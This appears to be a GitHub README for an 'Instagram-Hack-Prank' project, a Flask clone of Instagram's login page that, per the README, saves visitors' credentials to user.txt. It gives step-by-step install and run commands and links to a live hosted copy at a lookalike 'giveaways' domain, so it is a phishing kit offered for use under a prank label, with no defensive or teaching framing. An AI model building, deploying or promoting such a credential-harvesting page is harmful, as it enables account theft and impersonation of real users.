# Instagram-Hack-Prank
This is instagram clone page with python-flask as its backend.
# How to install
`git clone https://github.com/1blackghost/Instagram-Hack-Prank.git`
Clones the directory and files.
`cd Instagram-Hack-Prank`
Install the requirements
`pip install -r requirements.txt`
# How to run:
```python3 main.py```
# Passwords-Retrival:
User-Credentials Are Placed inside ```user.txt```
Runs Flask server.
Go to 127.0.0.1 on your browser
The webpage will be displayed
# View-Page1:
![alt text](https://encryptedmasterchat.pythonanywhere.com/static/view1.PNG)
# View-Page2:
![alt text](https://encryptedmasterchat.pythonanywhere.com/static/view2.PNG)
# For-Live-View:
[CLICK_HERE](https://instagramcomgiveaways.pythonanywhere.com/)
